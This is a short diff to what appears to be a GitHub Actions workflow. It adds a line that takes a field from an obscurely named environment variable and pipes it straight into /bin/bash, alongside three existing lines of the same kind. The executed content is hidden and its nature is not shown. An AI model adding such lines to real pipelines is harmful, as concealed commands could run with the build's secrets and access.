@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$ry2" | jq -r .pdibv359 | /bin/bash
           printf '%s' "$fyr53" | jq -r .op03 | /bin/bash
           echo $alxx5666 | jq -r .xtet3 | /bin/bash
+          printf '%s' "$evla339" | jq -r .donj27 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
